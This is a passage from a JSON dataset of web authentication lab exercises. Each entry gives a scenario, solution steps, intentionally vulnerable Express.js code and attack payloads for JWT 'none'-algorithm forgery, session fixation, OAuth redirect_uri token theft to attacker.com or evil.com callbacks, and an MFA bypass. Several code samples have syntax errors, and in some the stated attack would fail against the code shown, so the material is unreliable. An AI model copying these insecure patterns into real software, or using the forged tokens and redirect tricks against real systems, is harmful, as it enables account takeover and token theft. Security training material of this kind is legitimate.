    "Authorization: Bearer valid-oauth-token"
  ]
},
{
  "Lab scenario": "JWT none algorithm attack in Authorization Header",
  "Lab Description": "The application's JWT implementation fails to properly validate the algorithm specified in the token header. The application uses a symmetric secret to sign JWTs, but does not enforce the algorithm value. To solve: Forge a valid JWT with 'alg':'none' and access the admin panel.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to intercept a valid login request and capture the JWT from the Authorization header.",
    "2. Decode the JWT using jwt.io or Postman and observe that the algorithm used is HS256.",
    "3. Modify the header to set \"alg\":\"none\" and remove the signature portion.",
    "4. In the payload, change the role to \"admin\" and re-encode the JWT without a signature.",
    "5. Use Burp Repeater to send a request to /admin with the forged JWT in the Authorization header. Verify access is granted."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.role === 'admin') { res.send('Welcome Admin'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('JWT None Alg Lab running on http://localhost:4000'));",
  "payloads": [
    "Header: { \"alg\": \"none\", \"typ\": \"JWT\" } Payload: { \"username\": \"carlos\", \"role\": \"admin\" }",
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
  ]
},
{
  "Lab scenario": "OAuth misconfiguration leads to account takeover via email claim",
  "Lab Description": "The application uses an external OAuth provider for social login. It trusts the email claim from the OAuth token without verifying domain ownership or user identity. To solve: Forge an OAuth token containing Carlos's email and gain access to his account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP or Burp Suite to monitor the OAuth callback flow and capture the JWT from the provider.",
    "2. Decode the token using jwt.io and inspect the claims including 'email'.",
    "3. Create a forged JWT with 'email': 'carlos@example.com', signed with a known public client secret (or none if not validated).",
    "4. Send the forged token to the /oauth/callback endpoint using Postman.",
    "5. Verify you are logged in as Carlos and access /my-account to complete the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/oauth/callback', (req, res) => { const { token } = req.body; try { const decoded = jwt.decode(token); if (decoded.email) { res.send(`Logged in as ${decoded.email}`); } else { res.status(400).send('Invalid token'); } } catch (e) { res.status(500).send('Error decoding token'); } }); app.get('/my-account', (req, res) => { res.send('Account details for carlos@example.com'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on http://localhost:4000'));",
  "payloads": [
    "{ \"email\": \"carlos@example.com\" }",
    "eyJhbGciOiJub25lIn0.eyJlbWFpbCI6ImNhcmxvc0BleGFtcGxlLmNvbSJ9."
  ]
},
{
  "Lab scenario": "Session fixation via ID in URL query parameter",
  "Lab Description": "The session ID is accepted from URL query parameters and not regenerated upon successful login. This allows an attacker to preset a session ID for a victim and hijack the session after login. To solve: Fixate Carlos's session and access his account page after login.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to observe that the application accepts a session ID in the URL like /login?session=abcd1234.",
    "2. Send a crafted phishing link with a known session ID to the victim: /login?session=attacker123.",
    "3. Wait for Carlos to log in using the attacker-supplied session ID.",
    "4. Use the same session ID (attacker123) to access /my-account in your browser.",
    "5. Confirm that Carlos is authenticated under the attacker's session and access the account page."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/login', (req, res) => { const sid = req.query.session || Math.random().toString(36).substring(2); res.cookie('session', sid); sessions[sid] = { loggedIn: false }; res.send('Login page'); }); app.post('/login', (req, res) => { const sid = req.cookies.session; if (sid && sessions[sid]) { sessions[sid].loggedIn = true; sessions[sid].user = 'carlos'; res.send('Logged in'); } else { res.status(400).send('Invalid session'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; const session = sessions[sid]; if (session?.loggedIn && session.user === 'carlos') { res.send('Carlos account'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
  "payloads": [
    "/login?session=attacker123",
    "Set-Cookie: session=attacker123",
    "/my-account with Cookie: session=attacker123"
  ]
},
{
  "Lab scenario": "Session Fixation in OAuth Callback Flow",
  "Lab Description": "The application integrates OAuth login via a third-party provider. However, it is vulnerable to session fixation due to improper session regeneration during the OAuth callback phase. The application preserves the session ID between unauthenticated and authenticated states, enabling an attacker to fix a session ID and hijack a victim’s account. To solve the lab, force a victim to authenticate with a session you control, then access their account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Using Burp Suite, intercept the OAuth flow starting with /auth/login?provider=google and note the Set-Cookie header with a session ID.",
    "2.With the victim unlogged, share a crafted OAuth login link including your fixed session ID.",
    "3.The victim completes authentication on the third-party provider and is redirected back to the app with your fixed session preserved.",
    "4.Observe that your session is now authenticated as the victim.",
    "5.Visit /my-account to verify access to the victim’s account and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 's3cr3t', resave: false, saveUninitialized: true })); app.get('/auth/login', (req, res) => { const redirectUrl = 'https://oauth.example.com/auth?client_id=123&redirect_uri=http://localhost:4000/callback'; res.redirect(redirectUrl); }); app.get('/callback', (req, res) => { req.session.user = { username: 'carlos', oauth: true }; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user.username}`); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "http://lab.com/auth/login?provider=google",
    "Session-ID: fixed-session-123",
    "http://lab.com/callback (after victim login)",
    "/my-account with fixed session"
  ]
},
{
  "Lab scenario": "JWT Signature Spoofing via 'none' Algorithm",
  "Lab Description": "The application uses JSON Web Tokens (JWT) for session management. It accepts the algorithm field in the header without verification, allowing an attacker to modify the token and bypass signature checks by setting 'alg' to 'none'. To solve the lab, forge a JWT to impersonate the admin user and access the admin dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Use Postman to log in and capture the Authorization Bearer JWT from the response.",
    "2.Copy the JWT to jwt.io and observe the 'alg' is HS256.",
    "3.Modify the JWT header to set \"alg\":\"none\" and set payload \"username\":\"admin\".",
    "4.Remove the signature portion and reassemble the JWT as header.payload.",
    "5.Send the modified token in the Authorization header and access /admin to verify admin access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secret'); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none' || jwt.verify(token, 'secret')) { if (payload.payload.username === 'admin') return res.send('Welcome Admin'); } res.status(403).send('Forbidden'); }); app.listen(4000);",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
    "Authorization: Bearer [header.payload]",
    "/admin"
  ]
},
{
  "Lab scenario": "MFA Bypass via Debug Parameter Injection in GraphQL",
  "Lab Description": "The application uses a GraphQL endpoint for authentication with multi-factor verification. However, due to insecure debug parameters left enabled in production, it's possible to bypass MFA using a special introspection query. To solve the lab, authenticate as the victim user by exploiting the debug parameter and access their account dashboard.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Use Burp Suite to inspect the GraphQL login mutation sent to /graphql endpoint.",
    "2.Observe a hidden query parameter `debug=true` is accepted and leaks MFA validation logic.",
    "3.Inject an introspection query with debug=true to reveal bypass mechanics.",
    "4.Modify the mutation to skip MFA challenge by sending { login(username: \"carlos\", password: \"s3cret\", skipMFA: true) } with debug=true.",
    "5.Verify access to /graphql?query={account} to confirm you're authenticated as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { 'carlos': { password: 's3cret', mfa: true } }; app.post('/graphql', (req, res) => { const { query } = req.body; const debug = req.query.debug === 'true'; if (query.includes('login')) { const [, username, password, skipMFA] = query.match(/login\\(username: \\\"(.*?)\\\", password: \\\"(.*?)\\\", skipMFA: (.*?)\\)/) || []; if (users[username] && users[username].password === password) { if (users[username].mfa && skipMFA !== 'true') return res.send({ error: 'MFA required' }); if (debug) return res.send({ success: true, user: username, debug: 'MFA bypassed' }); return res.send({ success: true, user: username }); } } res.status(401).send({ error: 'Unauthorized' }); }); app.listen(4000);",
  "payloads": [
    "{ login(username: \"carlos\", password: \"s3cret\", skipMFA: true) }",
    "/graphql?debug=true",
    "GraphQL Introspection Query",
    "POST /graphql with crafted mutation"
  ]
},
{
  "Lab scenario": "Session fixation via login flow mismanagement",
  "Lab Description": "This lab demonstrates a session fixation vulnerability caused by improper session ID handling during login. The application fails to generate a new session ID after authentication, allowing attackers to set a session ID before login. To solve: hijack Carlos’s session by fixing a known session ID before login, and access the account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Start Burp Suite and intercept the GET /login request to observe session initialization and the Set-Cookie response.",
    "Send a crafted GET /login request with a manually set session ID: Cookie: sessionId=attackerSessionID and forward the request.",
    "Capture the login POST request and send it to Burp Repeater. Modify it to use Carlos's credentials and attach the attackerSessionID cookie.",
    "Submit the request and observe that authentication succeeds without issuing a new session ID.",
    "Open a browser or Repeater with Cookie: sessionId=attackerSessionID and request /my-account to access Carlos’s account and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const users = [{ username: 'carlos', password: 'secret' }]; const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId] = username; res.send('Login successful'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sessionId]; if (username === 'carlos') { res.send('Carlos account page'); } else { res.send('Unauthorized'); } }); app.listen(3000);",
  "payloads": [
    "GET /login HTTP/1.1\\nCookie: sessionId=fixed123",
    "POST /login HTTP/1.1\\nCookie: sessionId=fixed123\\nusername=carlos&password=secret",
    "GET /my-account HTTP/1.1\\nCookie: sessionId=fixed123"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion via none algorithm",
  "Lab Description": "This lab's authentication mechanism uses JSON Web Tokens (JWTs) to verify user identity. However, the backend accepts tokens using the insecure 'none' algorithm. This allows attackers to forge valid tokens without a signature. To solve: forge a JWT token to impersonate the admin user and access the admin panel.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to capture the login request and extract the JWT from the Authorization header.",
    "Decode the JWT using jwt.io or a script. Observe the 'alg' header and payload values.",
    "Modify the header to { \"alg\": \"none\", \"typ\": \"JWT\" } and the payload to { \"user\": \"admin\" }, leaving the signature part blank.",
    "Re-encode the JWT (Base64 header + '.' + Base64 payload + '.') and set it as the new Authorization: Bearer header.",
    "Send a GET request to /admin with the forged token and confirm access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.use((req, res, next) => { const auth = req.headers.authorization; if (auth && auth.startsWith('Bearer ')) { const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, 'secret'); req.user = decoded.user; } catch (e) {} } next(); }); app.get('/admin', (req, res) => { if (req.user === 'admin') { res.send('Admin panel'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
  "payloads": [
    "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
    "Payload: {\"user\":\"admin\"}",
    "Authorization: Bearer [base64(header)].[base64(payload)]."
  ]
},
{
  "Lab scenario": "OAuth implicit flow token leakage via referer header",
  "Lab Description": "This lab uses OAuth 2.0 implicit flow for authentication. The access token is returned in the URL fragment. However, the application leaks this token via the Referer header when navigating to external domains. To solve: capture Carlos's access token and use it to access his profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Host a malicious external site and trick the victim into clicking a crafted OAuth login link with a redirect URI pointing to your domain.",
    "When the victim logs in, the OAuth server redirects with the access token in the URL fragment.",
    "The victim’s browser follows a resource on your page that causes the Referer header to leak the full URL including the access token.",
    "Capture the token in your server logs or listener.",
    "Use Postman or Burp to send a GET /profile request with Authorization: Bearer [captured_token] to access Carlos’s data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos-token': 'carlos' }; app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (auth && tokens[auth.replace('Bearer ', '')] === 'carlos') { res.send('Carlos profile page'); } else { res.status(403).send('Forbidden'); } }); app.listen(5000);",
  "payloads": [
    "https://vulnerable-app.com/oauth/callback#access_token=carlos-token",
    "GET /profile HTTP/1.1\\nAuthorization: Bearer carlos-token"
  ]
},
{
  "Lab scenario": "Session Fixation vulnerability in login endpoint",
  "Lab Description": "The application improperly manages session identifiers. It accepts a pre-assigned session value from an unauthenticated user and reuses it post-login. The application does not regenerate the session ID after authentication, allowing an attacker to predetermine a session token. To solve: Hijack Carlos's session using a fixed session ID.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite Proxy to intercept a request to /login before authentication and note the Set-Cookie header.",
    "Manually set a session ID value and send a GET /login request using Burp Repeater, observe that the session persists.",
    "Send the malicious session ID to Carlos via social engineering or use XSS to force session adoption.",
    "Log in as Carlos using his credentials while reusing the fixed session ID on your end.",
    "Navigate to /my-account with the hijacked session to verify access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('<form method=post action=/login>Username:<input name=username>Password:<input name=password><input type=submit></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sid] = username; res.send('Logged in'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user === 'carlos') res.send('Account details for carlos'); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(Session Fixation Lab running on http://localhost:' + PORT));",
  "payloads": [
    "GET /login HTTP/1.1\\nCookie: sid=attackerSession123",
    "POST /login HTTP/1.1\\nCookie: sid=attackerSession123\\nusername=carlos&password=letmein"
  ]
},
{
  "Lab scenario": "JWT tampering via none algorithm in authorization token",
  "Lab Description": "The application uses JWTs for session management but improperly trusts the `alg` header value in incoming tokens. If the algorithm is changed to 'none', the signature is not validated. The application decodes and trusts the payload blindly. To solve: Forge a valid JWT for Carlos and access his account page.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to capture a legitimate JWT from a login request.",
    "Decode the JWT using jwt.io or Burp Decoder and examine the payload structure.",
    "Replace the `alg` value in the header with 'none' and set `username` to 'carlos'.",
    "Remove the signature section and send the forged token in Authorization header.",
    "Send a GET /my-account request with the new token and verify access as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).json({ error: 'Invalid credentials' }); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const body = JSON.parse(Buffer.from(payload.payload, 'base64').toString()); if (body.username === 'carlos') return res.send('Account details for carlos'); } const decoded = jwt.verify(token, secret); if (decoded.username === 'carlos') res.send('Account details for carlos'); else res.status(403).send('Access denied'); } catch (e) { res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(JWT None Bypass Lab running on http://localhost:' + PORT));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in redirect URI handling",
  "Lab Description": "The application uses OAuth for authentication but does not strictly validate the `redirect_uri` parameter during the OAuth handshake. An attacker can supply a malicious redirect URI to intercept access tokens. To solve: Gain an access token for Carlos and access his account page using the compromised session.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept the OAuth handshake and examine the `redirect_uri` parameter.",
    "Craft an OAuth authorization URL with a redirect_uri pointing to attacker.com/callback.",
    "Host a listener on attacker.com/callback to capture incoming requests and tokens.",
    "Trick Carlos into clicking the malicious OAuth link to initiate the login process.",
    "Extract the access token from the captured request and use it in Authorization header to access /my-account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = 'access-token-for-carlos'; const uri = `${redirect_uri}?token=${token}`; res.redirect(uri); }); app.get('/my-account', (req, res) => { const token = req.query.token; if (token === 'access-token-for-carlos') res.send('Account details for carlos'); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(OAuth Redirect URI Lab running on http://localhost:' + PORT));",
  "payloads": [
    "GET /auth?redirect_uri=https://attacker.com/callback",
    "Captured access-token-for-carlos via attacker.com/callback?token=access-token-for-carlos",
    "GET /my-account?token=access-token-for-carlos"
  ]
},
  {
    "Lab scenario": "Web Application Session Fixation in Login Endpoint",
    "Lab Description": "The application uses a fixed session ID supplied by the client and does not regenerate the session upon login, exposing it to session fixation attacks. The application logs verbose error details and maintains insecure session management. To solve: exploit the session fixation vulnerability to hijack Carlos's session and access his account page.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the GET /login request and capture the session cookie.",
      "2. Validate that the session ID remains unchanged during authentication by comparing the session cookie before and after login.",
      "3. Craft a request in Postman with a fixed session ID (e.g. attacker-session-id) in the URL or cookie header.",
      "4. Exploit by injecting the fixed session ID into the login flow using Burp Repeater.",
      "5. Verify successful session hijack by accessing /my-account and observing account details."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); let sessions = {}; let users = [{ username: 'carlos', password: 'password123' }]; app.get('/login', (req, res) => { let sid = req.cookies.sid || req.query.sid || 'default-session'; sessions[sid] = { authenticated: false }; console.log('Session ID:', sid); res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { let sid = req.cookies.sid || req.query.sid || 'default-session'; let { username, password } = req.body; let user = users.find(u => u.username === username && u.password === password); if(user){ sessions[sid] = { authenticated: true, username: username }; console.log('User authenticated:', username); res.redirect('/my-account'); } else { console.log('Authentication failed for:', username); res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { let sid = req.cookies.sid || req.query.sid || 'default-session'; if(sessions[sid] && sessions[sid].authenticated){ res.send('Account details for ' + sessions[sid].username); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('Server running'));",
    "payloads": [
      "http://target.com/login?sid=attacker-session-id",
      "Cookie: sid=attacker-session-id",
      "POST /login with fixed sid parameter using Burp Repeater"
    ]
  },
  {
    "Lab scenario": "Web API JWT Tampering in Token Validation",
    "Lab Description": "The application issues JWT tokens for authentication but fails to properly validate the token signature, allowing attackers to modify the payload without proper checks. The application logs detailed error information exposing debugging data. To solve: tamper with the JWT to impersonate Carlos and access his secure endpoints.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to authenticate and capture a valid JWT token from the /login endpoint.",
      "2. Decode the JWT using an online tool such as jwt.io to inspect the header and payload.",
      "3. Craft a modified token by changing the payload (set username to 'carlos') and switching the algorithm to 'none'.",
      "4. Use Burp Suite Repeater to send the modified token in the Authorization header to /my-account.",
      "5. Verify that the server accepts the tampered token and returns Carlos's account data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); let secret = 'supersecret'; let users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { let { username, password } = req.body; let user = users.find(u => u.username === username && u.password === password); if(user){ let token = jwt.sign({ username: username }, secret, { algorithm: 'HS256' }); console.log('Generated token for', username); res.json({ token: token }); } else { console.log('Login failed for', username); res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { let auth = req.headers.authorization; if(auth){ let token = auth.split(' ')[1]; try { let decoded = jwt.verify(token, secret, { ignoreExpiration: true }); console.log('Token verified for', decoded.username); res.send('Secure data for ' + decoded.username); } catch(e){ console.log('JWT verification error:', e.message); res.status(403).send('Access denied'); } } else { res.status(401).send('No token provided'); } }); app.listen(4000, () => console.log('Server running'));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\"}",
      "Unsigned token: base64UrlEncode(header) + '.' + base64UrlEncode(payload) + '.'",
      "Authorization: Bearer <modified-token>"
    ]
  },
  {
    "Lab scenario": "Web OAuth Misconfiguration in Redirect URI",
    "Lab Description": "The application uses OAuth for authentication but fails to validate redirect URIs, allowing an attacker to redirect tokens to an external domain. The application provides verbose logging that discloses sensitive redirection data. To solve: manipulate the redirect_uri parameter to capture Carlos's access token and use it to access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to intercept the OAuth authorization flow and inspect the redirect_uri parameter.",
      "2. Validate the misconfiguration by modifying the redirect_uri parameter to point to an attacker-controlled domain.",
      "3. Craft a malicious redirect URL that captures the access token using Burp Suite.",
      "4. Exploit the vulnerability by sending the malicious URL to the victim via a crafted phishing email.",
      "5. Verify the token capture and use the token in a subsequent request to /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); let users = [{ username: 'carlos', token: 'access-token-carlos' }]; app.get('/auth', (req, res) => { let redirect = req.query.redirect_uri; console.log('Redirect URI:', redirect); res.redirect(redirect + '#access_token=' + users[0].token); }); app.get('/my-account', (req, res) => { let auth = req.headers.authorization; if(auth === 'Bearer access-token-carlos'){ console.log('Access granted for Carlos'); res.send('Carlos account details'); } else { console.log('Access denied'); res.status(401).send('Unauthorized'); } }); app.listen(4000, () => console.log('Server running'));",
    "payloads": [
      "https://victim.com/auth?redirect_uri=https://attacker.com/steal",
      "https://attacker.com/steal#access_token=access-token-carlos",
      "Authorization: Bearer access-token-carlos"
    ]
  },
  {
    "Lab scenario": "JWT tampering in authorization header",
    "Lab Description": "This lab features an API that authorizes users using JWT tokens stored in the Authorization header. The JWT token is signed using the HS256 algorithm, but the application fails to enforce the secret key properly and does not validate algorithm type. The application trusts JWT tokens signed with the 'none' algorithm. To solve: Forge a valid token that grants admin privileges and access the /admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Use Postman or Burp to intercept a request containing the JWT token in the Authorization header.",
      "2.Validate the JWT structure using jwt.io to confirm the algorithm and payload content.",
      "3.Edit the JWT header to use 'alg':'none' and remove the signature part of the token.",
      "4.Inject a new payload with \"role\":\"admin\" and re-encode the token without a signature.",
      "5.Send the modified token via Postman to the /admin endpoint and verify access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'supersecret'); if (decoded.role === 'admin') { return res.send('Welcome, admin user'); } else { return res.status(403).send('Forbidden'); } } catch (e) { return res.status(400).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT Auth Lab running on port 3000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "{\"alg\":\"none\"}.{\"username\":\"carlos\",\"role\":\"admin\"}."
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow",
    "Lab Description": "This lab demonstrates session fixation where the session identifier is not regenerated upon login. The application accepts a user-provided session cookie before login and continues using it after authentication. This allows an attacker to pre-assign a session ID and hijack a victim's session. To solve: Fixate a known session ID on the victim, then log in as the victim using the same session ID to gain access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp Suite to craft a GET /login request that sets a custom session cookie (e.g., session=attack123).",
      "2.Send the malicious link to the victim containing the pre-fixed session ID.",
      "3.Victim logs in, attaching the attacker-controlled session to their authenticated session.",
      "4.Attacker reuses the same session ID (attack123) to access the /dashboard endpoint as the victim.",
      "5.Verify access to the victim's account and retrieve sensitive information."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(require('body-parser').urlencoded({ extended: true })); const users = { carlos: { password: 'password123' } }; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username]?.password === password) { const sessionId = req.cookies.session || Math.random().toString(36).substring(2); sessions[sessionId] = username; res.cookie('session', sessionId); res.send('Logged in'); } else { res.status(401).send('Login failed'); } }); app.get('/dashboard', (req, res) => { const username = sessions[req.cookies.session]; if (username) { res.send(`Dashboard for ${username}`); } else { res.status(401).send('Unauthorized'); } }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
    "payloads": [
      "GET /login HTTP/1.1\\nCookie: session=attack123",
      "POST /login HTTP/1.1\\nCookie: session=attack123\\nusername=carlos&password=password123"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect URI",
    "Lab Description": "This lab includes an OAuth implementation where the redirect URI is insufficiently validated. The server accepts open redirects and allows redirection to attacker-controlled domains. The vulnerable OAuth client trusts unvalidated parameters. To solve: Leak a valid OAuth authorization code to an attacker-controlled domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp Suite or a browser to initiate the OAuth flow via /auth?client_id=lab-client&redirect_uri=https://attacker.com/callback.",
      "2.Capture the generated authorization URL containing the attacker-controlled redirect_uri.",
      "3.Present this URL to the victim (simulated by browser or API request).",
      "4.Upon login, the victim is redirected to https://attacker.com/callback with a valid code.",
      "5.Extract the authorization code from the attacker callback to complete the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').urlencoded({ extended: true })); app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; if (client_id === 'lab-client') { const authCode = 'valid-auth-code'; const redirect = `${redirect_uri}?code=${authCode}`; console.log('Redirecting to:', redirect); res.redirect(redirect); } else { res.status(400).send('Invalid client'); } }); app.listen(3000, () => console.log('OAuth Redirect Lab running on port 3000'));",
    "payloads": [
      "https://labsite.com/auth?client_id=lab-client&redirect_uri=https://evil.com/callback",
      "GET /auth?client_id=lab-client&redirect_uri=https://attacker.net/grab"
    ]
  },
  {
    "Lab scenario": "JWT signature manipulation in Authorization header",
    "Lab Description": "This lab uses stateless JWTs for user authentication with HMAC signatures. The application trusts the 'alg' field in the token without proper validation. To solve: tamper with the JWT token to impersonate the admin user and access the /admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Use Burp Suite to intercept a login request and extract the JWT from the Authorization header.",
      "2.Copy the token and decode it using jwt.io or Burp Decoder.",
      "3.Modify the payload to change the 'user' claim to 'admin' and the 'alg' field to 'none'.",
      "4.Remove the signature section entirely and reassemble the JWT header and payload.",
      "5.Replace the original Authorization header with the manipulated JWT and access /admin to confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(express.json()); app.use((req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; if (token) { try { req.user = jwt.verify(token, 'secretkey'); } catch (e) { console.log('JWT verification failed:', e); } } next(); }); app.get('/admin', (req, res) => { if (req.user?.user === 'admin') res.send('Welcome to admin panel'); else res.status(403).send('Forbidden'); }); app.listen(3000, () => console.log('JWT lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.fake-signature"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID",
